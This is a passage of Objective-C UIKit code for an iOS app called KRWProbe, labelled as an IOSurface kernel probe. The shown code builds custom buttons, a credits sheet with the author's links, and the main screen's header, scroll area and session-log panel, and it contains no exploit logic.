        self.layer.shadowOpacity = 0.65;
        self.layer.shadowRadius = 5.0;
        self.layer.shadowOffset = CGSizeZero;
    }
    return self;
}
- (void)layoutSubviews {
    [super layoutSubviews];
    self.layer.cornerRadius = CGRectGetWidth(self.bounds) / 2.0;
    self.layer.shadowPath = [UIBezierPath bezierPathWithOvalInRect:self.bounds].CGPath;
}
- (void)startPulse {
    [UIView animateWithDuration:1.5
                          delay:0.2
                        options:UIViewAnimationOptionRepeat |
                                UIViewAnimationOptionAutoreverse |
                                UIViewAnimationOptionAllowUserInteraction |
                                UIViewAnimationOptionBeginFromCurrentState
                     animations:^{ self.alpha = 0.45; }
                     completion:nil];
}
- (void)pop {
    [UIView animateWithDuration:0.16
                     animations:^{ self.transform = CGAffineTransformMakeScale(1.55, 1.55); }
                     completion:^(BOOL finished) {
        [UIView animateWithDuration:0.42
                              delay:0
             usingSpringWithDamping:0.55
              initialSpringVelocity:0.6
                            options:UIViewAnimationOptionAllowUserInteraction |
                                    UIViewAnimationOptionBeginFromCurrentState
                         animations:^{ self.transform = CGAffineTransformIdentity; }
                         completion:nil];
    }];
}
@end

typedef NS_ENUM(NSInteger, KRWActionStyle) {
    KRWActionStyleTile,
    KRWActionStylePrimary,
    KRWActionStyleDanger,
    KRWActionStyleDock
};

@interface KRWActionButton : UIButton
@property (nonatomic, assign) CGFloat baseShadowOpacity;
- (instancetype)initWithTitle:(NSString *)title
                     subtitle:(NSString *)subtitle
                  iconContent:(UIView *)iconContent
                         tint:(UIColor *)tint
                        style:(KRWActionStyle)style;
@end

@implementation KRWActionButton {
    UIView *_background;
    CAGradientLayer *_gradient;
    UIView *_badge;
    UILabel *_title;
    UILabel *_subtitle;
}

- (instancetype)initWithTitle:(NSString *)titleText
                     subtitle:(NSString *)subtitleText
                  iconContent:(UIView *)iconContent
                         tint:(UIColor *)tint
                        style:(KRWActionStyle)style {
    self = [super initWithFrame:CGRectZero];
    if (!self) return nil;

    self.translatesAutoresizingMaskIntoConstraints = NO;
    self.adjustsImageWhenHighlighted = NO;
    self.showsTouchWhenHighlighted = NO;
    self.backgroundColor = [UIColor clearColor];
    self.layer.cornerRadius = (style == KRWActionStylePrimary) ? 18.0 : 16.0;
    self.layer.cornerCurve = kCACornerCurveContinuous;
    self.layer.shadowColor = (style == KRWActionStylePrimary)
        ? KRWAccentDeep().CGColor : [UIColor blackColor].CGColor;
    self.baseShadowOpacity = (style == KRWActionStylePrimary) ? 0.28 : 0.12;
    self.layer.shadowOpacity = self.baseShadowOpacity;
    self.layer.shadowRadius = (style == KRWActionStylePrimary) ? 16.0 : 10.0;
    self.layer.shadowOffset = CGSizeMake(0, 6);

    UIColor *titleColor = KRWText();
    UIColor *subtitleColor = KRWSub();
    UIColor *badgeTint = tint ?: KRWAccent();
    UIColor *background = KRWTile();
    CGFloat borderAlpha = 0.04;
    UIColor *borderColor = KRWColorA(255, 255, 255, borderAlpha);

    if (style == KRWActionStylePrimary) {
        titleColor = KRWColor(24, 18, 38);
        subtitleColor = KRWColorA(30, 20, 48, 0.70);
        badgeTint = KRWColorA(20, 14, 32, 0.10);
        background = KRWAccentDeep();
        borderColor = [UIColor clearColor];
    } else if (style == KRWActionStyleDanger) {
        background = KRWColorA(255, 122, 122, 0.09);
        borderColor = KRWColorA(255, 122, 122, 0.22);
        subtitleColor = KRWColor(201, 164, 164);
    } else if (style == KRWActionStyleDock) {
        background = KRWTile();
        borderColor = KRWColorA(255, 255, 255, 0.035);
        self.baseShadowOpacity = 0.0;
        self.layer.shadowOpacity = 0.0;
    }

    _background = [[UIView alloc] init];
    _background.translatesAutoresizingMaskIntoConstraints = NO;
    _background.userInteractionEnabled = NO;
    _background.backgroundColor = background;
    _background.layer.cornerRadius = self.layer.cornerRadius;
    _background.layer.cornerCurve = kCACornerCurveContinuous;
    _background.layer.borderWidth = 0.5;
    _background.layer.borderColor = borderColor.CGColor;
    _background.layer.masksToBounds = YES;
    [self addSubview:_background];

    if (style == KRWActionStylePrimary) {
        _gradient = [CAGradientLayer layer];
        _gradient.colors = @[ (id)KRWColor(139, 92, 246).CGColor,
                              (id)KRWColor(192, 132, 252).CGColor ];
        _gradient.startPoint = CGPointMake(0, 0);
        _gradient.endPoint = CGPointMake(1, 1);
        _gradient.cornerRadius = self.layer.cornerRadius;
        [_background.layer insertSublayer:_gradient atIndex:0];
    }

    CGFloat badgeSide = (style == KRWActionStylePrimary) ? 30.0 : 26.0;
    _badge = [[UIView alloc] init];
    _badge.translatesAutoresizingMaskIntoConstraints = NO;
    _badge.userInteractionEnabled = NO;
    _badge.backgroundColor = (style == KRWActionStylePrimary)
        ? badgeTint : [badgeTint colorWithAlphaComponent:0.13];
    _badge.layer.cornerRadius = badgeSide * 0.31;
    _badge.layer.cornerCurve = kCACornerCurveContinuous;
    [self addSubview:_badge];

    iconContent.translatesAutoresizingMaskIntoConstraints = NO;
    iconContent.userInteractionEnabled = NO;
    [_badge addSubview:iconContent];

    UIFont *titleFont = (style == KRWActionStylePrimary)
        ? KRWFont(UIFontTextStyleHeadline, 15.5, UIFontWeightSemibold, 18.5)
        : KRWFont(UIFontTextStyleSubheadline, 13.5, UIFontWeightSemibold, 16.0);
    UIFont *subtitleFont = (style == KRWActionStylePrimary)
        ? KRWFont(UIFontTextStyleFootnote, 10.5, UIFontWeightMedium, 12.5)
        : KRWFont(UIFontTextStyleCaption2, 9.8, UIFontWeightRegular, 11.8);

    _title = KRWLabel(titleText, titleFont, titleColor);
    _title.numberOfLines = 1;
    _title.adjustsFontSizeToFitWidth = YES;
    _title.minimumScaleFactor = 0.72;
    _title.lineBreakMode = NSLineBreakByTruncatingTail;
    _title.adjustsFontForContentSizeCategory = YES;

    NSMutableArray *textViews = [NSMutableArray arrayWithObject:_title];
    if (subtitleText.length) {
        _subtitle = KRWLabel(subtitleText, subtitleFont, subtitleColor);
        _subtitle.numberOfLines = 1;
        _subtitle.adjustsFontSizeToFitWidth = YES;
        _subtitle.minimumScaleFactor = 0.75;
        _subtitle.lineBreakMode = NSLineBreakByTruncatingTail;
        _subtitle.adjustsFontForContentSizeCategory = YES;
        [textViews addObject:_subtitle];
    }
    UIStackView *textStack = [[UIStackView alloc] initWithArrangedSubviews:textViews];
    textStack.translatesAutoresizingMaskIntoConstraints = NO;
    textStack.axis = UILayoutConstraintAxisVertical;
    textStack.alignment = UIStackViewAlignmentLeading;
    textStack.spacing = 1.0;
    [self addSubview:textStack];

    [NSLayoutConstraint activateConstraints:@[
        [_background.leadingAnchor constraintEqualToAnchor:self.leadingAnchor],
        [_background.trailingAnchor constraintEqualToAnchor:self.trailingAnchor],
        [_background.topAnchor constraintEqualToAnchor:self.topAnchor],
        [_background.bottomAnchor constraintEqualToAnchor:self.bottomAnchor],
        [_badge.leadingAnchor constraintEqualToAnchor:self.leadingAnchor constant:10.0],
        [_badge.centerYAnchor constraintEqualToAnchor:self.centerYAnchor],
        [_badge.widthAnchor constraintEqualToConstant:badgeSide],
        [_badge.heightAnchor constraintEqualToConstant:badgeSide],
        [iconContent.centerXAnchor constraintEqualToAnchor:_badge.centerXAnchor],
        [iconContent.centerYAnchor constraintEqualToAnchor:_badge.centerYAnchor],
        [textStack.leadingAnchor constraintEqualToAnchor:_badge.trailingAnchor constant:8.0],
        [textStack.trailingAnchor constraintEqualToAnchor:self.trailingAnchor constant:-10.0],
        [textStack.centerYAnchor constraintEqualToAnchor:self.centerYAnchor]
    ]];

    self.accessibilityLabel = subtitleText.length
        ? [NSString stringWithFormat:@"%@, %@", titleText, subtitleText]
        : titleText;
    self.accessibilityIdentifier = titleText;
    self.accessibilityTraits = UIAccessibilityTraitButton;
    return self;
}

- (void)layoutSubviews {
    [super layoutSubviews];
    _gradient.frame = _background.bounds;
    _background.layer.cornerRadius = self.layer.cornerRadius;
    self.layer.shadowPath = [UIBezierPath bezierPathWithRoundedRect:self.bounds
                                                       cornerRadius:self.layer.cornerRadius].CGPath;
}
- (void)setHighlighted:(BOOL)highlighted {
    [super setHighlighted:highlighted];
    if (UIAccessibilityIsReduceMotionEnabled()) {
        self.alpha = highlighted ? 0.80 : 1.0;
        return;
    }
    CGFloat scale = highlighted ? 0.96 : 1.0;
    [UIView animateWithDuration:highlighted ? 0.13 : 0.46
                          delay:0
         usingSpringWithDamping:highlighted ? 1.0 : 0.58
          initialSpringVelocity:highlighted ? 0.0 : 0.55
                        options:UIViewAnimationOptionBeginFromCurrentState |
                                UIViewAnimationOptionAllowUserInteraction
                     animations:^{
        self.transform = CGAffineTransformMakeScale(scale, scale);
        self.layer.shadowOpacity = highlighted ? 0.02 : self.baseShadowOpacity;
        self.alpha = highlighted ? 0.94 : 1.0;
    } completion:nil];
}
@end

@interface KRWInfoRow : UIView
- (instancetype)initWithTitle:(NSString *)title
                        value:(NSString *)value
                     monoValue:(BOOL)monoValue;
@end
@implementation KRWInfoRow
- (instancetype)initWithTitle:(NSString *)title
                        value:(NSString *)value
                     monoValue:(BOOL)monoValue {
    self = [super initWithFrame:CGRectZero];
    if (!self) return nil;
    self.translatesAutoresizingMaskIntoConstraints = NO;

    UILabel *left = KRWLabel(title,
        KRWFont(UIFontTextStyleBody, 13.5, UIFontWeightRegular, 16.0), KRWText());
    UILabel *right = KRWLabel(value,
        monoValue ? KRWMono(10.0, UIFontWeightRegular, 12.0)
                  : KRWFont(UIFontTextStyleSubheadline, 12.5, UIFontWeightMedium, 15.0),
        monoValue ? KRWSub() : KRWSub());
    right.textAlignment = NSTextAlignmentRight;
    right.numberOfLines = 1;
    right.lineBreakMode = NSLineBreakByTruncatingMiddle;
    right.adjustsFontSizeToFitWidth = YES;
    right.minimumScaleFactor = 0.7;

    [self addSubview:left];
    [self addSubview:right];
    [NSLayoutConstraint activateConstraints:@[
        [self.heightAnchor constraintEqualToConstant:42.0],
        [left.leadingAnchor constraintEqualToAnchor:self.leadingAnchor constant:8.0],
        [left.centerYAnchor constraintEqualToAnchor:self.centerYAnchor],
        [right.leadingAnchor constraintGreaterThanOrEqualToAnchor:left.trailingAnchor constant:12.0],
        [right.trailingAnchor constraintEqualToAnchor:self.trailingAnchor constant:-8.0],
        [right.centerYAnchor constraintEqualToAnchor:self.centerYAnchor],
        [left.topAnchor constraintGreaterThanOrEqualToAnchor:self.topAnchor constant:10.0],
        [left.bottomAnchor constraintLessThanOrEqualToAnchor:self.bottomAnchor constant:-10.0]
    ]];
    return self;
}
@end

#pragma mark - Credits sheet

@interface KRWCreditsVC : UIViewController
@end

@implementation KRWCreditsVC {
    UIView *_card;
    UIControl *_dim;
    BOOL _animatedIn;
}

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleLightContent;
}

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor clearColor];
    self.modalPresentationStyle = UIModalPresentationOverFullScreen;
    self.modalTransitionStyle = UIModalTransitionStyleCrossDissolve;

    _dim = [[UIControl alloc] initWithFrame:CGRectZero];
    _dim.translatesAutoresizingMaskIntoConstraints = NO;
    _dim.backgroundColor = [UIColor colorWithWhite:0 alpha:0.62];
    [_dim addTarget:self action:@selector(dismissSheet) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:_dim];

    _card = [[UIView alloc] initWithFrame:CGRectZero];
    _card.translatesAutoresizingMaskIntoConstraints = NO;
    _card.backgroundColor = KRWColor(34, 38, 46);
    _card.layer.cornerRadius = 28.0;
    _card.layer.cornerCurve = kCACornerCurveContinuous;
    _card.layer.borderWidth = 0.5;
    _card.layer.borderColor = KRWColorA(255, 255, 255, 0.08).CGColor;
    _card.layer.maskedCorners = kCALayerMinXMinYCorner | kCALayerMaxXMinYCorner |
                                kCALayerMinXMaxYCorner | kCALayerMaxXMaxYCorner;
    _card.layer.shadowColor = [UIColor blackColor].CGColor;
    _card.layer.shadowOpacity = 0.45;
    _card.layer.shadowRadius = 30.0;
    _card.layer.shadowOffset = CGSizeMake(0, 12);
    [self.view addSubview:_card];

    UIView *grabber = [[UIView alloc] initWithFrame:CGRectZero];
    grabber.translatesAutoresizingMaskIntoConstraints = NO;
    grabber.backgroundColor = KRWColorA(255, 255, 255, 0.16);
    grabber.layer.cornerRadius = 2.0;
    [_card addSubview:grabber];

    UILabel *title = KRWLabel(@"Credits",
        KRWFont(UIFontTextStyleTitle1, 25.0, UIFontWeightBold, 30.0), KRWText());
    UILabel *who = KRWLabel(@"murk-sus  ·  KRWProbe 1.8",
        KRWFont(UIFontTextStyleFootnote, 11.5, UIFontWeightMedium, 14.0), KRWSub());
    who.adjustsFontSizeToFitWidth = YES;
    who.minimumScaleFactor = 0.8;

    KRWActionButton *github = [[KRWActionButton alloc]
        initWithTitle:@"GitHub"
             subtitle:@"murk-sus  ·  github.com/murk-sus"
          iconContent:KRWGitHubIcon(15.0)
                 tint:KRWText()
                style:KRWActionStyleTile];
    [github.heightAnchor constraintEqualToConstant:62.0].active = YES;
    [github addTarget:self action:@selector(openGitHub) forControlEvents:UIControlEventTouchUpInside];

    KRWActionButton *telegram = [[KRWActionButton alloc]
        initWithTitle:@"Telegram"
             subtitle:@"murk-sus  ·  t.me/@asuka4scape_developer"
          iconContent:KRWSymbolIcon(@"paperplane.fill", KRWTelegramBlue(), 16.0)
                 tint:KRWTelegramBlue()
                style:KRWActionStyleTile];
    [telegram.heightAnchor constraintEqualToConstant:62.0].active = YES;
    [telegram addTarget:self action:@selector(openTelegram) forControlEvents:UIControlEventTouchUpInside];

    UIButton *done = [UIButton buttonWithType:UIButtonTypeSystem];
    done.translatesAutoresizingMaskIntoConstraints = NO;
    [done setTitle:@"Done" forState:UIControlStateNormal];
    [done setTitleColor:KRWText() forState:UIControlStateNormal];
    done.titleLabel.font = KRWFont(UIFontTextStyleHeadline, 14.0, UIFontWeightSemibold, 17.0);
    done.backgroundColor = KRWTile();
    done.layer.cornerRadius = 15.0;
    done.layer.cornerCurve = kCACornerCurveContinuous;
    done.layer.borderWidth = 0.5;
    done.layer.borderColor = KRWColorA(255, 255, 255, 0.06).CGColor;
    [done addTarget:self action:@selector(dismissSheet) forControlEvents:UIControlEventTouchUpInside];
    [done.heightAnchor constraintEqualToConstant:48.0].active = YES;

    UIStackView *stack = [[UIStackView alloc] initWithArrangedSubviews:@[ title, who, github, telegram, done ]];
    stack.translatesAutoresizingMaskIntoConstraints = NO;
    stack.axis = UILayoutConstraintAxisVertical;
    stack.spacing = 10.0;
    [stack setCustomSpacing:4.0 afterView:title];
    [stack setCustomSpacing:18.0 afterView:who];
    [stack setCustomSpacing:18.0 afterView:telegram];
    [_card addSubview:stack];

    UIButton *close = [UIButton buttonWithType:UIButtonTypeSystem];
    close.translatesAutoresizingMaskIntoConstraints = NO;
    [close setImage:[UIImage systemImageNamed:@"xmark"] forState:UIControlStateNormal];
    close.tintColor = KRWSub();
    close.backgroundColor = KRWColorA(255, 255, 255, 0.06);
    close.layer.cornerRadius = 16.0;
    [close addTarget:self action:@selector(dismissSheet) forControlEvents:UIControlEventTouchUpInside];
    [_card addSubview:close];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [_dim.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [_dim.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [_dim.topAnchor constraintEqualToAnchor:self.view.topAnchor],
        [_dim.bottomAnchor constraintEqualToAnchor:self.view.bottomAnchor],

        [_card.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:14.0],
        [_card.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-14.0],
        [_card.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-10.0],

        [grabber.topAnchor constraintEqualToAnchor:_card.topAnchor constant:10.0],
        [grabber.centerXAnchor constraintEqualToAnchor:_card.centerXAnchor],
        [grabber.widthAnchor constraintEqualToConstant:38.0],
        [grabber.heightAnchor constraintEqualToConstant:4.0],

        [stack.leadingAnchor constraintEqualToAnchor:_card.leadingAnchor constant:18.0],
        [stack.trailingAnchor constraintEqualToAnchor:_card.trailingAnchor constant:-18.0],
        [stack.topAnchor constraintEqualToAnchor:grabber.bottomAnchor constant:16.0],
        [stack.bottomAnchor constraintEqualToAnchor:_card.bottomAnchor constant:-18.0],

        [close.widthAnchor constraintEqualToConstant:32.0],
        [close.heightAnchor constraintEqualToConstant:32.0],
        [close.trailingAnchor constraintEqualToAnchor:_card.trailingAnchor constant:-16.0],
        [close.topAnchor constraintEqualToAnchor:_card.topAnchor constant:16.0]
    ]];

    _card.transform = CGAffineTransformMakeTranslation(0, 460);
    _dim.alpha = 0.0;
    self.view.alpha = 0.0;
}

- (void)viewDidAppear:(BOOL)animated {
    [super viewDidAppear:animated];
    if (_animatedIn) return;
    _animatedIn = YES;
    [UIView animateWithDuration:0.22 animations:^{
        self.view.alpha = 1.0;
        _dim.alpha = 1.0;
    }];
    [UIView animateWithDuration:0.58
                          delay:0.03
         usingSpringWithDamping:0.86
          initialSpringVelocity:0.3
                        options:UIViewAnimationOptionAllowUserInteraction |
                                UIViewAnimationOptionBeginFromCurrentState
                     animations:^{ _card.transform = CGAffineTransformIdentity; }
                     completion:nil];
}
- (void)dismissSheet {
    [UIView animateWithDuration:0.24
                          delay:0
                        options:UIViewAnimationOptionBeginFromCurrentState
                     animations:^{
        self.view.alpha = 0.0;
        _card.transform = CGAffineTransformMakeTranslation(0, 420);
    } completion:^(BOOL finished) {
        [self dismissViewControllerAnimated:NO completion:nil];
    }];
}
- (void)openGitHub { KRWOpenURL(@"https://github.com/murk-sus"); }
- (void)openTelegram { KRWOpenURL(@"https://t.me/@asuka4scape_developer"); }
@end

#pragma mark - Main probe screen

@interface ProbeVC : UIViewController
@end

@implementation ProbeVC {
    UIView *_header;
    UIScrollView *_scroll;
    UIStackView *_content;
    UIView *_logSection;
    NSLayoutConstraint *_logHeight;
    UIView *_dock;
    UIButton *_copyButton;
    UIView *_infoCard;
    CAGradientLayer *_backgroundGradient;
    CAGradientLayer *_glowGradient;
    BOOL _didFadeIn;
    BOOL _didInitialLogScroll;
}

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = KRWBG();
    self.view.layer.masksToBounds = YES;

    [self buildBackground];    [self buildHeader];
    [self buildScroll];
    [self buildLog];
    [self buildDock];
    [self buildContent];

    _header.alpha = 0.0;
    _scroll.alpha = 0.0;
    _logSection.alpha = 0.0;
    _dock.alpha = 0.0;

    set_phase(@"idle — press a mode");
}

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleLightContent;
}

- (void)buildBackground {
    CAGradientLayer *bg = [CAGradientLayer layer];
    bg.colors = @[ (id)KRWColor(36, 40, 51).CGColor,
                   (id)KRWColor(30, 34, 41).CGColor,
                   (id)KRWColor(23, 26, 32).CGColor ];
    bg.locations = @[ @0.0, @0.36, @1.0 ];
    bg.startPoint = CGPointMake(0.5, 0.0);
    bg.endPoint = CGPointMake(0.5, 1.0);
    [self.view.layer insertSublayer:bg atIndex:0];
    _backgroundGradient = bg;

    CAGradientLayer *glow = [CAGradientLayer layer];
    glow.type = kCAGradientLayerRadial;
    glow.colors = @[ (id)KRWColorA(124, 92, 255, 0.13).CGColor,
                     (id)KRWColorA(124, 92, 255, 0.0).CGColor ];
    glow.locations = @[ @0.0, @1.0 ];
    glow.startPoint = CGPointMake(0.5, 0.5);
    glow.endPoint = CGPointMake(1.0, 1.0);
    glow.name = @"krw.glow";
    [self.view.layer insertSublayer:glow atIndex:1];
    _glowGradient = glow;
}

- (void)buildHeader {
    _header = [[UIView alloc] initWithFrame:CGRectZero];
    _header.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:_header];

    UILabel *eyebrow = KRWLabel(@"", KRWFont(UIFontTextStyleCaption1, 10.0,
                                             UIFontWeightSemibold, 12.5), KRWAccent());
    eyebrow.attributedText = KRWTracked(@"IOSURFACE · KERNEL PROBE",
                                        eyebrow.font, KRWAccent(), 1.5);
    eyebrow.textAlignment = NSTextAlignmentCenter;

    UILabel *title = KRWLabel(@"KRWProbe",
        KRWFont(UIFontTextStyleLargeTitle, 31.0, UIFontWeightBold, 38.0), KRWText());
    title.textAlignment = NSTextAlignmentCenter;
    title.numberOfLines = 1;
    title.adjustsFontSizeToFitWidth = YES;
    title.minimumScaleFactor = 0.68;
    title.adjustsFontForContentSizeCategory = YES;
    title.layer.shadowColor = KRWColorA(0, 0, 0, 0.5).CGColor;
    title.layer.shadowOpacity = 0.5;
    title.layer.shadowRadius = 12.0;
    title.layer.shadowOffset = CGSizeMake(0, 4);

    UILabel *version = KRWLabel([NSString stringWithFormat:@"v%@", app_version()],
        KRWFont(UIFontTextStyleCaption1, 10.5, UIFontWeightSemibold, 12.5), KRWAccent());
    UIView *pill = [[UIView alloc] initWithFrame:CGRectZero];
    pill.translatesAutoresizingMaskIntoConstraints = NO;
    pill.backgroundColor = KRWColorA(167, 139, 250, 0.13);
    pill.layer.cornerRadius = 9.0;
    pill.layer.cornerCurve = kCACornerCurveContinuous;
    pill.layer.borderWidth = 0.5;
    pill.layer.borderColor = KRWColorA(167, 139, 250, 0.20).CGColor;
    [pill addSubview:version];
    [NSLayoutConstraint activateConstraints:@[
        [version.leadingAnchor constraintEqualToAnchor:pill.leadingAnchor constant:8.0],
        [version.trailingAnchor constraintEqualToAnchor:pill.trailingAnchor constant:-8.0],
        [version.topAnchor constraintEqualToAnchor:pill.topAnchor constant:4.0],
        [version.bottomAnchor constraintEqualToAnchor:pill.bottomAnchor constant:-4.0]
    ]];

    UIButton *info = [UIButton buttonWithType:UIButtonTypeSystem];
    info.translatesAutoresizingMaskIntoConstraints = NO;
    [info setImage:[UIImage systemImageNamed:@"info.circle"] forState:UIControlStateNormal];
    info.tintColor = KRWSub();
    info.backgroundColor = KRWColorA(255, 255, 255, 0.055);
    info.layer.cornerRadius = 19.0;
    info.layer.borderWidth = 0.5;
    info.layer.borderColor = KRWColorA(255, 255, 255, 0.08).CGColor;
    info.accessibilityLabel = @"Credits and information";
    [info addTarget:self action:@selector(onCredits) forControlEvents:UIControlEventTouchUpInside];

    [_header addSubview:eyebrow];
    [_header addSubview:title];
    [_header addSubview:pill];
    [_header addSubview:info];

    [NSLayoutConstraint activateConstraints:@[
        [_header.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor constant:4.0],
        [_header.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor constant:18.0],
        [_header.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-18.0],
        [_header.heightAnchor constraintEqualToConstant:72.0],

        [eyebrow.centerXAnchor constraintEqualToAnchor:_header.centerXAnchor],
        [eyebrow.topAnchor constraintGreaterThanOrEqualToAnchor:_header.topAnchor],

        [title.centerXAnchor constraintEqualToAnchor:_header.centerXAnchor],
        [title.centerYAnchor constraintEqualToAnchor:_header.centerYAnchor constant:7.0],
        [title.leadingAnchor constraintGreaterThanOrEqualToAnchor:pill.trailingAnchor constant:8.0],
        [title.trailingAnchor constraintLessThanOrEqualToAnchor:info.leadingAnchor constant:-8.0],

        [eyebrow.bottomAnchor constraintEqualToAnchor:title.topAnchor constant:-3.0],

        [pill.leadingAnchor constraintEqualToAnchor:_header.leadingAnchor],
        [pill.centerYAnchor constraintEqualToAnchor:title.centerYAnchor],
        [pill.heightAnchor constraintEqualToConstant:24.0],

        [info.trailingAnchor constraintEqualToAnchor:_header.trailingAnchor],
        [info.centerYAnchor constraintEqualToAnchor:title.centerYAnchor],
        [info.widthAnchor constraintEqualToConstant:38.0],
        [info.heightAnchor constraintEqualToConstant:38.0]
    ]];
}

- (void)buildScroll {
    _scroll = [[UIScrollView alloc] initWithFrame:CGRectZero];
    _scroll.translatesAutoresizingMaskIntoConstraints = NO;
    _scroll.backgroundColor = [UIColor clearColor];
    _scroll.showsVerticalScrollIndicator = YES;
    _scroll.indicatorStyle = UIScrollViewIndicatorStyleWhite;
    _scroll.alwaysBounceVertical = YES;
    _scroll.scrollsToTop = YES;
    _scroll.contentInsetAdjustmentBehavior = UIScrollViewContentInsetAdjustmentNever;
    [self.view addSubview:_scroll];

    _content = [[UIStackView alloc] initWithFrame:CGRectZero];
    _content.translatesAutoresizingMaskIntoConstraints = NO;
    _content.axis = UILayoutConstraintAxisVertical;
    _content.alignment = UIStackViewAlignmentFill;
    _content.spacing = 20.0;
    [_scroll addSubview:_content];

    [NSLayoutConstraint activateConstraints:@[
        [_scroll.topAnchor constraintEqualToAnchor:_header.bottomAnchor constant:8.0],
        [_scroll.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [_scroll.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],

        [_content.leadingAnchor constraintEqualToAnchor:_scroll.contentLayoutGuide.leadingAnchor constant:16.0],
        [_content.trailingAnchor constraintEqualToAnchor:_scroll.contentLayoutGuide.trailingAnchor constant:-16.0],
        [_content.topAnchor constraintEqualToAnchor:_scroll.contentLayoutGuide.topAnchor constant:2.0],
        [_content.bottomAnchor constraintEqualToAnchor:_scroll.contentLayoutGuide.bottomAnchor constant:-18.0],
        [_content.widthAnchor constraintEqualToAnchor:_scroll.frameLayoutGuide.widthAnchor constant:-32.0]
    ]];
}

- (void)buildLog {
    _logSection = [[UIView alloc] initWithFrame:CGRectZero];
    _logSection.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:_logSection];

    UIView *header = [[UIView alloc] initWithFrame:CGRectZero];
    header.translatesAutoresizingMaskIntoConstraints = NO;
    [_logSection addSubview:header];

    UILabel *label = KRWLabel(@"", KRWFont(UIFontTextStyleCaption1, 12.0,
                                           UIFontWeightBold, 14.0), KRWSub());
    label.attributedText = KRWTracked(@"SESSION LOG", label.font, KRWSub(), 0.8);

    KRWStatusDot *dot = [[KRWStatusDot alloc] initWithFrame:CGRectZero];
    dot.backgroundColor = KRWGreen();
    dot.layer.shadowColor = KRWGreen().CGColor;
    [dot startPulse];

    UILabel *live = KRWLabel(@"LIVE", KRWFont(UIFontTextStyleCaption1, 9.5,
                                              UIFontWeightBold, 11.5), KRWGreen());
    live.attributedText = KRWTracked(@"LIVE", live.font, KRWGreen(), 0.8);

    UIButton *copy = [UIButton buttonWithType:UIButtonTypeSystem];
    copy.translatesAutoresizingMaskIntoConstraints = NO;
    [copy setTitle:@"COPY" forState:UIControlStateNormal];
    [copy setTitleColor:KRWSub() forState:UIControlStateNormal];
    copy.titleLabel.font = KRWFont(UIFontTextStyleCaption2, 9.0, UIFontWeightBold, 11.0);
    copy.backgroundColor = KRWColorA(255, 255, 255, 0.055);
    copy.layer.cornerRadius = 9.0;
    copy.layer.cornerCurve = kCACornerCurveContinuous;
    copy.contentEdgeInsets = UIEdgeInsetsMake(4, 8, 4, 8);
    [copy addTarget:self action:@selector(onCopyLog) forControlEvents:UIControlEventTouchUpInside];
    _copyButton = copy;

    [header addSubview:label];
    [header addSubview:dot];
    [header addSubview:live];
    [header addSubview:copy];

    KRWCardView *card = [[KRWCardView alloc] initWithFrame:CGRectZero];
    card.backgroundColor = KRWColor(17, 20, 25);
    card.layer.cornerRadius = 20.0;
    card.layer.shadowOpacity = 0.10;
    [_logSection addSubview:card];

    UITextView *text = [[UITextView alloc] initWithFrame:CGRectZero];
    text.translatesAutoresizingMaskIntoConstraints = NO;
    text.editable = NO;
    text.selectable = YES;
    text.scrollEnabled = YES;
    text.backgroundColor = [UIColor clearColor];
    text.textColor = KRWColor(159, 231, 181);
    text.font = KRWMono(9.5, UIFontWeightRegular, 11.5);
    text.textContainerInset = UIEdgeInsetsMake(12, 12, 14, 12);
    text.textContainer.lineFragmentPadding = 0;
    text.layoutManager.allowsNonContiguousLayout = YES;
    text.indicatorStyle = UIScrollViewIndicatorStyleWhite;
    text.scrollsToTop = NO;
    text.alwaysBounceVertical = YES;
    text.tintColor = KRWAccent();
    text.adjustsFontForContentSizeCategory = YES;
    gView = text;

    [gLogLock lock];
    text.text = gLog.length ? [gLog copy] : @"";
    [gLogLock unlock];

    [card addSubview:text];
    [NSLayoutConstraint activateConstraints:@[
        [header.topAnchor constraintEqualToAnchor:_logSection.topAnchor],
        [header.leadingAnchor constraintEqualToAnchor:_logSection.leadingAnchor],
        [header.trailingAnchor constraintEqualToAnchor:_logSection.trailingAnchor],
        [header.heightAnchor constraintEqualToConstant:20.0],

        [label.leadingAnchor constraintEqualToAnchor:header.leadingAnchor constant:6.0],
        [label.centerYAnchor constraintEqualToAnchor:header.centerYAnchor],

        [copy.trailingAnchor constraintEqualToAnchor:header.trailingAnchor],
        [copy.centerYAnchor constraintEqualToAnchor:header.centerYAnchor],

        [live.trailingAnchor constraintEqualToAnchor:copy.leadingAnchor constant:-8.0],
        [live.centerYAnchor constraintEqualToAnchor:header.centerYAnchor],

        [dot.trailingAnchor constraintEqualToAnchor:live.leadingAnchor constant:-5.0],
        [dot.centerYAnchor constraintEqualToAnchor:header.centerYAnchor],
        [dot.widthAnchor constraintEqualToConstant:7.0],
        [dot.heightAnchor constraintEqualToConstant:7.0],

        [card.topAnchor constraintEqualToAnchor:header.bottomAnchor constant:8.0],
        [card.leadingAnchor constraintEqualToAnchor:_logSection.leadingAnchor],
        [card.trailingAnchor constraintEqualToAnchor:_logSection.trailingAnchor],
        [card.bottomAnchor constraintEqualToAnchor:_logSection.bottomAnchor],

        [text.leadingAnchor constraintEqualToAnchor:card.leadingAnchor constant:1.0],
        [text.trailingAnchor constraintEqualToAnchor:card.trailingAnchor constant:-1.0],
        [text.topAnchor constraintEqualToAnchor:card.topAnchor constant:1.0],
        [text.bottomAnchor constraintEqualToAnchor:card.bottomAnchor constant:-1.0]
    ]];

    _logHeight = [_logSection.heightAnchor constraintEqualToConstant:190.0];
    _logHeight.active = YES;

